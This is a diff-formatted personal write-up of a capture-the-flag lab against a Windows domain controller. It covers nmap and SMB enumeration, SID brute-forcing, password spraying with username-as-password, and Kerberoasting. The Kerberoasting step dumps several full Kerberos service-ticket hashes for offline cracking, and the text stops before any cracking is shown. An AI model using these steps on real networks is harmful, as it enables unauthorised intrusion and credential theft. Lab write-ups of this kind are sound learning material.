@@ -1,1 +1,704 @@
-DC
+			ENUMERATION
+			
+
+---nmap---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# nmap 10.0.2.115 -sS -sV -A -T4    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-21 16:47 EDT
+Nmap scan report for 10.0.2.115
+Host is up (0.00093s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-22 06:47:55Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+MAC Address: 08:00:27:89:8F:12 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:89:8f:12 (Oracle VirtualBox virtual NIC)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-07-22T06:47:59
+|_  start_date: N/A
+|_clock-skew: 10h00m00s
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.93 ms 10.0.2.115
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.29 seconds
+                                                            
+
+
+--- We discover the subdomain soupedecode.local
+
+
+--- I notice the smb service, I utilize an smbmap scan but got no result, try smbclient ---
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient -L 10.0.2.115          
+Password for [WORKGROUP\root]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	backup          Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.0.2.115 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                            
+
+
+
+--- I try scanning for these shared files ---
+
+
+                                                                                                       
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //10.0.2.115/IPC$      
+Password for [WORKGROUP\root]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+NT_STATUS_NO_SUCH_FILE listing \*
+smb: \> dir
+NT_STATUS_NO_SUCH_FILE listing \*
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //10.0.2.115/Users
+Password for [WORKGROUP\root]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+NT_STATUS_ACCESS_DENIED listing \*
+smb: \> dir
+NT_STATUS_ACCESS_DENIED listing \*
+smb: \> 
+
+
+
+--- As the anonymous user we cannot view the files, we look for some alternative ways ---
+			
+
+
+
+--- I search for users utilizing the lookupsid.py script ---
+
+
+
+Source code:
+
+https://github.com/fortra/impacket/blob/master/examples/lookupsid.py
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# python3 lookupsid.py 'soupedecode.local/anonymous@10.0.2.115'
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Password:
+[*] Brute forcing SIDs at 10.0.2.115
+[*] StringBinding ncacn_np:10.0.2.115[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
+498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: SOUPEDECODE\Administrator (SidTypeUser)
+501: SOUPEDECODE\Guest (SidTypeUser)
+502: SOUPEDECODE\krbtgt (SidTypeUser)
+512: SOUPEDECODE\Domain Admins (SidTypeGroup)
+513: SOUPEDECODE\Domain Users (SidTypeGroup)
+514: SOUPEDECODE\Domain Guests (SidTypeGroup)
+515: SOUPEDECODE\Domain Computers (SidTypeGroup)
+516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
+517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
+518: SOUPEDECODE\Schema Admins (SidTypeGroup)
+519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
+520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
+521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
+522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
+525: SOUPEDECODE\Protected Users (SidTypeGroup)
+526: SOUPEDECODE\Key Admins (SidTypeGroup)
+527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
+553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
+571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
+572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
+1000: SOUPEDECODE\DC01$ (SidTypeUser)
+1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
+1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
+1103: SOUPEDECODE\bmark0 (SidTypeUser)
+
+.
+.
+.
+.
+.
+.
+
+
+
+
+
+
+--- We find lots of usernames, let's get them into a file. To automatize this process I will use a python
+script ---
+
+
+--- First I will write the output of the looksupid script into a txt file named output.txt ---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# python3 lookupsid.py 'soupedecode.local/anonymous@10.0.2.115' > output.txt
+
+
+
+--- then write the python script ---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# cat convert.py 
+# Open the output file in read mode
+with open('output.txt', 'r') as file1:
+    data = file1.read()
+
+# Split the data into individual lines
+lines = data.splitlines()
+
+# Open the user.txt file in write mode
+with open('user.txt', 'w') as file2:
+    for line in lines:
+        # Check if the line contains a SID entry
+        if 'SOUPEDECODE\\' in line:
+            # Split the line by spaces and extract the part containing the username
+            parts = line.split()
+            for part in parts:
+                if part.startswith('SOUPEDECODE\\'):
+                    # Extract the username
+                    username = part.split('\\')[1]
+                    # Write the username to the user.txt file
+                    file2.write(username + '\n')
+
+print('Done')
+              
+
+
+
+--- This python script opens the output.txt, reads it all and then stores it in the data variable.
+Then splits the lines and processes each of them to get the usernames ---
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# python3 convert.py                                                        
+Done
+
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# cat user.txt 
+Enterprise
+Administrator
+Guest
+krbtgt
+Domain
+Domain
+Domain
+Domain
+Domain
+Cert
+Schema
+Enterprise
+Group
+Read-only
+Cloneable
+Protected
+Key
+Enterprise
+RAS
+Allowed
+Denied
+DC01$
+DnsAdmins
+DnsUpdateProxy
+bmark0
+otara1
+kleo2
+eyara3
+pquinn4
+jharper5
+bxenia6
+gmona7
+oaaron8
+pleo9
+evictor10
+wreed11
+bgavin12
+ndelia13
+akevin14
+kxenia15
+ycody16
+qnora17
+dyvonne18
+.
+.
+.
+.
+.
+
+
+
+--- Now that we have the usernames in the user.txt file, lets utilize the crackmapexec tool to find the 
+valid username --- 
+
+
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# crackmapexec smb 10.0.2.115 -u user.txt -p user.txt --continue-on-success --no-bruteforce
+
+.
+.
+.
+SMB         10.0.2.115      445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE 
+SMB         10.0.2.115      445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE 
+SMB         10.0.2.115      445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
+SMB         10.0.2.115      445    DC01             [-] SOUPEDECODE.LOCAL\file_svc:file_svc STATUS_LOGON_FAILURE 
+SMB         10.0.2.115      445    DC01             [-] SOUPEDECODE.LOCAL\charlie:charlie STATUS_LOGON_FAILURE 
+.
+.
+.
+
+
+
+
+--- we get the correct credentials ---
+
+
+ybob317:ybob317 
+
+
+
+			
+--- now let's take a look at ybob317's files via smbclient---
+			
+
+
+
+
+
+
+
+			GAINING FOOTHOLD
+			
+			
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //10.0.2.115/Users -U ybob317
+Password for [WORKGROUP\ybob317]:
+Try "help" to get a list of possible commands.
+
+
+smb: \> ls
+  .                                  DR        0  Mon Jun 17 20:24:29 2024
+  ..                                DHS        0  Mon Jun 17 20:42:50 2024
+  Administrator                       D        0  Sat Jun 15 22:56:40 2024
+  All Users                       DHSrn        0  Sat May  8 11:26:16 2021
+  Default                           DHR        0  Sun Jun 16 05:51:08 2024
+  Default User                    DHSrn        0  Sat May  8 11:26:16 2021
+  desktop.ini                       AHS      174  Sat May  8 11:14:03 2021
+  Public                             DR        0  Sat Jun 15 20:54:32 2024
+  ybob317                             D        0  Mon Jun 17 20:24:32 2024
+
+		12942591 blocks of size 4096. 10825039 blocks available
+
+smb: \> cd ybob317
+
+smb: \ybob317\> ls
+  .                                   D        0  Mon Jun 17 20:24:32 2024
+  ..                                 DR        0  Mon Jun 17 20:24:29 2024
+  3D Objects                         DR        0  Mon Jun 17 20:24:32 2024
+  AppData                            DH        0  Mon Jun 17 20:24:30 2024
+  Application Data                DHSrn        0  Mon Jun 17 20:24:30 2024
+  Contacts                           DR        0  Mon Jun 17 20:24:32 2024
+  Cookies                         DHSrn        0  Mon Jun 17 20:24:30 2024
+  Desktop                            DR        0  Mon Jun 17 20:45:32 2024
+  Documents                          DR        0  Mon Jun 17 20:24:32 2024
+  Downloads                          DR        0  Mon Jun 17 20:24:32 2024
+  Favorites                          DR        0  Mon Jun 17 20:24:32 2024
+  Links                              DR        0  Mon Jun 17 20:24:32 2024
+  Local Settings                  DHSrn        0  Mon Jun 17 20:24:30 2024
+  Music                              DR        0  Mon Jun 17 20:24:32 2024
+  My Documents                    DHSrn        0  Mon Jun 17 20:24:30 2024
+  NetHood                         DHSrn        0  Mon Jun 17 20:24:30 2024
+  NTUSER.DAT                        AHn   262144  Mon Jul 22 09:31:26 2024
+  ntuser.dat.LOG1                   AHS    45056  Mon Jun 17 20:24:29 2024
+  ntuser.dat.LOG2                   AHS        0  Mon Jun 17 20:24:29 2024
+  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TM.blf    AHS    65536  Mon Jun 17 20:24:54 2024
+  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Mon Jun 17 20:24:29 2024
+  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Mon Jun 17 20:24:29 2024
+  ntuser.ini                        AHS       20  Mon Jun 17 20:24:30 2024
+  Pictures                           DR        0  Mon Jun 17 20:24:32 2024
+  Recent                          DHSrn        0  Mon Jun 17 20:24:30 2024
+  Saved Games                        DR        0  Mon Jun 17 20:24:32 2024
+  Searches                           DR        0  Mon Jun 17 20:24:32 2024
+  SendTo                          DHSrn        0  Mon Jun 17 20:24:30 2024
+  Start Menu                      DHSrn        0  Mon Jun 17 20:24:30 2024
+  Templates                       DHSrn        0  Mon Jun 17 20:24:30 2024
+  Videos                             DR        0  Mon Jun 17 20:24:32 2024
+
+
+smb: \ybob317\> cd Desktop
+
+smb: \ybob317\Desktop\> dir
+  .                                  DR        0  Mon Jun 17 20:45:32 2024
+  ..                                  D        0  Mon Jun 17 20:24:32 2024
+  desktop.ini                       AHS      282  Mon Jun 17 20:24:32 2024
+  user.txt                            A       32  Wed Jun 12 14:54:32 2024
+
+
+smb: \ybob317\Desktop\> more user.txt
+
+---First User Flag---
+
+		
+
+
+--- Now look for more clues to priv escalate ---
+
+	
+
+
+
+
+
+				PRIVILEGE ESCALATION
+
+
+
+--- now what we can do is we can look for other users, in the github repo that we found lookupsid, we find
+the script getuserspns.py, this script  tries to find service principal names that are associated with normal
+user acount like the the one we have access too ---
+
+
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# python3 getuserspns.py -dc-ip 10.0.2.115 SOUPEDECODE.LOCAL/ybob317:ybob317 -request           
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
+----------------------  --------------  --------  --------------------------  ---------  ----------
+FTP/FileServer          file_svc                  2024-06-17 20:32:23.726085  <never>               
+FW/ProxyServer          firewall_svc              2024-06-17 20:28:32.710125  <never>               
+HTTP/BackupServer       backup_svc                2024-06-17 20:28:49.476511  <never>               
+HTTP/WebServer          web_svc                   2024-06-17 20:29:04.569417  <never>               
+HTTPS/MonitoringServer  monitoring_svc            2024-06-17 20:29:18.511871  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+       
+
+
+--- these are the kerberos table users here ---
+
+
+--- we receive an error that says clock skew too great. After some research we discover that kerberos system
+is sensitive with its date times. A way to fix this issue, we can use the rdate command to sync the 
+clock of our kali with the target machine ---
+
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# sudo rdate -n 10.0.2.115               
+Tue Jul 23 00:53:21 +03 2024
+                                                                                                          
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# python3 getuserspns.py -dc-ip 10.0.2.115 soupedecode.local/ybob317:ybob317 -request 
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
+----------------------  --------------  --------  --------------------------  ---------  ----------
+FTP/FileServer          file_svc                  2024-06-17 20:32:23.726085  <never>               
+FW/ProxyServer          firewall_svc              2024-06-17 20:28:32.710125  <never>               
+HTTP/BackupServer       backup_svc                2024-06-17 20:28:49.476511  <never>               
+HTTP/WebServer          web_svc                   2024-06-17 20:29:04.569417  <never>               
+HTTPS/MonitoringServer  monitoring_svc            2024-06-17 20:29:18.511871  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$s...........................
+
+
+
+
+--- now we got the hashes of the users, I will write this into a file and then utilize a hash crack attack with
+john ---
+
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# python3 getuserspns.py -dc-ip 10.0.2.115 soupedecode.local/ybob317:ybob317 -request > hash.txt
+
+
+
+
+
+--- The hashes we have look like this ---
+
+
+$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$soupedecode.local/file_svc*$b61bde7e8faedf0d377de0608e89a1f2$8ea67a002f87f3481b05d3b259f0b50ac0bf222e1c76a5666190e284b89b217c670ad5d02776f46437863d2038a09c08e239c1c826e28aef4eec9639cb52aea2c2a0194b41f9d0b17494d6d4235d2c1a438c209e1c464d7dbfb8ee99d94c97eae685f2484c461197c4d3a0206ca4289e071a5b69962fe9928ffcd618943a8e7eda09feec8a242ea7a1913b2ba76acf2fd868a9aef8ae657e7858b4303336eef603114bf3510c4bbf2eab233c27bf76332b22115d6a14e6792e5900f43c9d8c10114672c426c31d4347c3b7c1e2dd388eeb1bed081573ac5cc39175573a709dc165f7cf9e1675e340f3d6de9924b83a86e990f3b2185b25e8e40f28cc35a734a29b4740bd049ad32c9688dc9347be466f1c513571ac7e7b00a600ba3e56cdb105f2eee52fc92058cf4842ab708b3392c71dcbd2f5f38d40d2bb4f0c01535d3ff747a7e8f612abcdd073b21c4e3271f39dbc94fccb255447687d09aa62c9ebf5d225dd8486b9a729ecf1e56e35d2966f3ed0e40128086ca3b73c796d00817ffcdb4f426e8ec9350fad1bf8b009b54319c768ce9a2c62a34cf784a40491c830797b49d6f59b9f2b5c75a0603b47f8755c3cf55b198c5bad628ff5975cebfcad7042f7cc35007f0c9e4ffc00d9704002041fe50a12d61c4c90556f1359f4cc1938f173e62ffd42a726fff7846f1e5b0abdf8947881d4ed03782db986c43de39e5a6482c1db62fe98d524a06e5195dac1db5d09a9bfc2600d11caeeb8cd6fdcfde978feb134dd65747d40b5ffdeefcff1ea3e6d43de500ad08381fa7968168e56b85bd2cadeb2a67ea7c11ad48e146d5599eca7cbe0fb83f688594be949c413eec1051c3222cf459f266fbc45484aa3d56b7fae76a771b173d1bc0e772bae45f701b7976564e4001d1fd672bc70aa1240a01545f370d78a346d0695e4da4ba4e8fe33fe45f008b517a97a4b5d555183fc1b24a1d2c89660fa52d01aeaad5caadc0f03a484f0c465f83d7ca5360156e6cc8173d8bc3ee8a926bcf638f7dae846b68399880b1b395310913ef138bb9add27440953f0d11430c3e99d9d61d14e454c4829497f502eaa9f8d12e0e3ce0ee1e1923667c65994dcb39bc679d537ab1f9be77735295c61a771aaffe323982b834e7cab8d6300168476bb0a48f5c11d4cc51040410e2a1170d944cdeb57667e91ec409e6e1f10a8df144abf9466d47f57b820abf322775b9a473ec3923125218963a538d63a7b6e54c1da2869e5dc65749eae185ed0d6c6903e026a57dc79af3aacfa16b86e49589894a9f4ca54f2d01b2ae2e116fb26e1847d3ca6f9f4c01ebd795fdb8bf6a5a4d82c293b2a79286a14790bbe014ae500dfac12ae6faf6f2a02e093dd1dfd11c0c11a1b4e8f433aea8cc87b69e8caeae01ebcdb14519ca4b35907f4d10174fa41e3154178ea0cf1a0a5cf44e2cb66d02714a231f4f64b4b0ca832c66d79874cbd7d9ca525921c2a0cd2bc19fcf2
+$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$soupedecode.local/firewall_svc*$bf6b39b5414ded26f70acd49792b0197$21dc6c22463eed9c674172126090886f2e1d62386a3961d3dca88775a3e6a12ae640744d9d31b8e0b9fb31f9e55d6cbd11ae548ae4d16d5fae1079d2030971191a7b6e7924263db6cd0e4cd270802a66311d23688d961ef92e7cbde22bc6beb6e49b5ae59f18e153b196a4925359eaa79178abb1935a1cc409eac633b07fa5a322d129ac87449ecff23f3403bc99fc69999fbab080055af7cb2c5a94738b4b2db25f28cf6e703181d7411d90c83017afa83a4443ff675e705c1f4882b9aceddc989e116893e1557fc8dc457344eff782b11c15ec47f77fc7b0cb460e19111400e3f9a73ad62cc0967dd4f66bd8114b86b4e79904ebe95a1700a2d10f5330043fab8f12822c3b237fe483c7397d69a8712a9e342f9640a5c5e68bfc500bd666463b32e0678983e477b2937cbef956183db5ccbc15e8fd0d24f4a8d4ff1d0dff4a3d43adb210cf2303262e2e94b80d817eacaea1c10cb795a3cdbb84de47c23f344c74264d16b51b212f666be58d4b24734c7aba84ed033a541863d12918ad110066e6bb7a7130872b6fd7896c8efba98b54a38bf0c6f2ba6d62b71f10352a2f980144d49f460e54cdda77f3889f6b7c8f67be242d5d3ec56cb6d7883db51538c241e7d4d350136de31824c1839a0a7de9e9f2274a3255cfc544685f9bd856b563125cfa411a8f598d3d7b4bb92ca6729728e6cc0aa77db6c276b04cf2ec56f0df6cfb48f75cd10b38edc0ba6399b86597bcb61b2ca61651cb9c7ba18d344ede77064578aa8db78b0af514c29f3bb39f0162793eb552bd4a9d2f829675b7e051e8ff7e9a74b44716bc92d9c1986e913dbe67d9686cbfce317bac77387ab08b7c6ba39416ed7d6d6447d535a412d70410ca7a2803ceaa652752315717711d0e41389d14b1a5bd2045ff9852ac4c0df9cecbdb4c257985866780efe7ed5e125d5b623f084f75fd11bb10d3300b861646af097c094281c0734f1f522d98720831781ce9dd970eb91ab703a2228eb7e3322c6d47d2baf36dee8dc119df0bcd49371c22e6d2511cdc97f7e90f648af348e40b15a615847d2a4a76136495c40345549f57512ef3bd452dafa291f0c35ac4f27c167a61deb2f9db73da2ef557eb2fdee0d071245161a5fdac114fb7a87fdcca5547ce574a41e0180f8ce0c3ec79b22dd2effd931913014e42f6e49283e80d0e75f85deb9db581069b1c1e71a8d69773eaac16f84177faa2d508ced2eafda8cfdbe3e0dd85ca15933779b357bd2387f9f517ac53085d4a42a2446de3505f5202ce52dc0fc7cafedf141a64000e2fb3c4533e5ed559e4c63a10c04610d279ab191db94d7e25fd810f5238c693ddfbdc0219c7e1c49dc331de3440274da0db85a72891db94bb347170351fcdef698d80323364a50f60f2c0f01550a9b6f2cf5e1456c93b0ad2506a2e61559e082e90744a52609ce8522cc1eba5689f6221967a80b48a13774d8c77e74ce398971050ba12ac09b5
+$krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$soupedecode.local/backup_svc*$88a9fa13354a62b50a32944e8ff79bbd$2afca128dcae814d25201de164422493c1802600ff2d9b08b8780b070c2cce5e3ad7dceae16022300c72a6a0a89e335298539b9b740e9cdd3b22fea2927a011004b6c93561814ced7943fdd6ac26e860bad35356f0fbc7ab4224a071f24696c91383f3a4f83d7e6d653220bdc23f21c237f6fb27a24b39af418e3923d7eb1294746ec8c432605821fc6c0d7000e6769531e11f45d125f87cb3423328eb1501abec78a00d37e114049a4101e04af8a77c39b3dc398db951894cf8b199306c96dea9127f5e064019c2baa7b89050227a643da0977813b3320ad6e7256daa6aee92f6986c6bcdb319a7df19e68935fac7a8a67cda5f138e97cb49559ecb4bf5d20ac12008cb46428cccba8dd18a8b7ebac54f93a7c94754e71e5d1b39b4ef4716f33985cd0f0da3261aec8b179840682c174daa7c710eead5e53ab251bc3fcb0871c01b58bc7618897e1a3ab3668f322a28cea8c9addb9afc562a7685a1b33bf903b7c58d7da865ab540b3ec1bad8a4c19254478797bdab7a8519f857ca06ed5562dd0b166c8571510f3b6639cc6de3ac262db9bc500a751ade338b1faa29cfc2b48a677f8b3ceb86a16056d6a5040f940fb872581409c54290d59b08d525406f988ff7dee2f5d22f5570d3a7110124d7ee42333b043b2ec45d7a3458aa48962cf5beff11a4179af0d4117ec170ba4cd5efb70a21d6984c8ce77c78d435bfb2b60b49698336b6cc3f0da8acff5eda46e7d6b63e00e57508d6cb284fc471c46a9cef7a0375eb4c8d997527fd1d2d27e4ab8858d14b764ff78063704116bc0b3359b268ce6c5923cc159bceef7abc08fcb0af0774df108fdcc6abb434352c2c0694581b889bc586da5603c03cbc95b30848e34f378f3629e6a110a78c473d17400d6a6256482c677568cdb007fe16fc0a737bf1d589d7c7318d9103388a07e5dd9be1e78994b6aafbf034af425ba8bce85c00038a642b29b8aecaa5eb69c87761a0808cc41032de65f84bf31af6e046de7377d61794cea4774ca81404bacb195ff8fb1de23b3f80692603ead40a77b05f6d6e032f5cbe97645ae2316878fedc87252f939a2f46e0ca36952bfb972ec4fefdbb71713d7869d6cf6509fbd01abe74d636d859c1128bba3ecbf518d59004688c04a9c9a5d8d2aa597ba597b2f446c72f6fafde15a72f4064763423287b2f72a9d0212c5551552e0ab0e8387b4aa5d3036193daefee005c458a8290174a923902d8c5468a0bc880134eaa5175fb8b14e78c06ba5ce6c896ba1b91eafcc5315da2f33a0c16fbfa9a1aa6d26326de15ed5ec1cab48496c8e06239e63d50ac22d8e863c7c9190234951b7871e3cedc035b9ea68b95d10379dfa34bb7e421754dac142c7857d6f8251cf41f9ced9634781c60a5a5fe68e9d6ac4ed737dc136ef6aaa51070be5411dad0442d271e9c9cf650dce7e3b37a2e2cabeaa56bf70334be289af5bd066da798dd47e40a71ac8257096b37fc
+$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$soupedecode.local/web_svc*$c7d2bbfb23466e1bfa8e30667a966ca7$3fb4dd264eddf406eda6bdab2135ef4591930c730be785f7435b02730b911d774caf19af479cd4bc29ce17f7e396c06c437dffeb152ea3b10dd6f3457ab211e8948505811d7799c09cc61ab3d8330a08827e50b815497fb4c548e7e1c792860b43068b63b1eeac7e3f61827d9f4bbd52107ea5b47ca724ad9fdf7acfe62166ec422d435b7c9283effdf3cd75055f41e410fe000a59f2b56e4e96a4a4e353579db3854858c1df0d9aa18d748adb356ddf0d451b14da66db9b753a41f88c82a6be9eb0a7ab98893c9dfd8d2a4e97164ed61d073bc2d94674c028bcc1594a9272b6f0df7de321139a7400d759ac86376f7b4a0411c96ef804bd970b6e621c5148357b3fe1dbdee25344ffa6062003891231d01c3c61e875f971624cad74b3da95e7404a038f13f30df2991753a859e3c13b4af97f9c329827658f61d5164a398f3c0d0e429c9bd30446d823f05b79a54526d73223075ddec415a6da2e5798cc11d96f05c773620fc1835b7e9cbeff689d788b763ea1c3de2572a0df4410a5ca26c6bc3ba5345124c2387179b15aab3de86507ed870660a1b55853af867d09a189b34dd29b9b502f8444b111c2fea82cf8256f3d628eebefe6f89b51395b986158d5dcf9cd6d31d133cc7619f7c4936585ec982f8d64dad8efcbe3762f75e6d1810cb223f11d99ec5d410772b4e8b40cbb8d5cee5139f44cc4f2c43eef941fb5a7d26839d1036579c9470d04cc79cf6b7822c0f882402ebc4720a0ad90d72024f91a53ef98b9593c2f0f4ed186f864917a27ee3589ff7519ec4f41b154e1d9b64b75a8dd2e00258b491c51267993fb481b296c2a45d395cab2a1eeb0acb12d851faf55ac9f647b578e50f75f5c7889cb98cb72a5773ccc4797f6846379017a2f6ceb275e4ec69f96b0e6f8a0e652a9ae723cb9d7c582a7918f6d4a52a7a3b5a870d0538285549c6a7f169d953abdd5226e07481e9cba740a7456b69b39e948409a5d32113f253849574eb5298e3b596d492fdd66aae2135f57ff406958fdd60dc360429baf2490abdaf2982b66335f136cf0881b5ab82d2e03b3347ba81bdd4ab775a501d687055e8c862fc4d271caec073d61595afa3937b0067fd290e5ecf43e1f51f8dd6b13c219df59e44187023ffbbc85c386ae49e27ffd2da42ffc2324e2cb550782f01a5a541f96e9f5fdce371af54fa2ab8079cb0c757e3aeb30ee3a3f9ea5c7d2398509e417fc935e16a43718f0dbe0696ef5ff05c30a5ca9639f353e175d78524b1f1131cbcc2fafb4006b41957248a5ed8976f37a943d8ca7ca1ed03491dc7a20bc520fd42e87d5167e992e8484bf6460887c124db0a191a85f6953e9fd303975b011fb2de30cd9885cd8f72654d73139d2a27d69af768397d8e1f370bffc4e4f7e48950a08427da4dfedece9843383504a532291c3bf37a136da7c0673503d757914b7742b12cc4cae9aaef1e22f49be9ea6ed2264a2f4d1484d17edf0
+$krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$soupedecode.local/monitoring_svc*$d315a2f5bb5d007fbe79334e501f394c$0cc24a074f2f885536807ec33e0ee921eff460eecbb68ec44e2257012bdc9a67e2fab95b2a8341c6dcdaaba7d597b084ec35868f19f7218a388f094b4a6b66d67211f4532a2ed9484ab818e7b2656b97a689d85226f163ae11cdf04609fca135a379c6c1c5b302cba628a32b19a5aae7c01dd54e02ef6f74550551b3aa612c7a3b01b22a898fe9700a644c20c3af36d3f7413924406ab4fc230bd1f2c5dc403833b61f3d2ec4a8c6ebda23e0e6aa08307260dab88875d8d655f60bea6bd1e9fc8f38eef593561125b9a0eb6fac61194da44f2761df56e5d41863e49f07f2237684d3d9af261222228cb7523798c35ed2c924034288d9ebf4d537acca566b6138ff49d05db5340458ec83019e33792a0fcf01cc5b99c2f75846b05335426cb96d24c5e9ffcc268878efed1dc80b2d80e7329d979fa599f6bd9834bdd41eba9ff95d2382ed15ca0a745c3953123d4148cd223a1bab1b29a7692d1a5caeb9bd035bd0d012e561489d873cbbb02b5701b37876070a4b66135141a16e9f2542dc83af828a4db03e15460813e878e1a770ed9d3acc762a1dfae3673c4f0b649b8ecd1ff2ad3530cd60a6b9e62d1b7821f2d7f488a706eb1da1212ea553b202fd12b5f912ddd8968afd71975431da0a0a7a27098b4991709097317749126fb071a7d4e87ca2eb9eba51e8d33e2ab2ef3d38c1927d29f5a0cfcf8744084d982f6829c20d8c7ec6eccb68b37762ca4a37c71ccfd9b62b81746f5c42d742cc4a3b90d775c3f8705c192d1bc438e8c03d1de7bb2f7b8bda7fc9898a9aad19ebb89e746ba8dea53a0e6548c3f403076a9697e3c3d963ebc519c6e7571ec11282ccd3fad8f956ba7806c63ee2d2c1888343b917bb95c99c80756559cb12350d22143811f460778e5c5b007c2412587d3d45ce4145b0f8b7a93c26a523900848432cc4c3205c2130424f321acb0bb00d1dcf1d7b303805da54ba2317bed0af7fea98cd99065f29a7cf5c6bedb27c7eecf958e26bae919de7769b70573b127e8813ddb6e1986a2728e7ee489380dc92f7199a210114d4f3e48544705681e2351ec70ab34ded10d67a4955f6ee329068fe2bb31eca0104eee9fe36cbc5850512c05734ce8bad9726ec0de6931a3d945c1ecebc2f2c802f56771203d9585efe2aa2eef8bcbdc15e204cfe88ebab1931222fde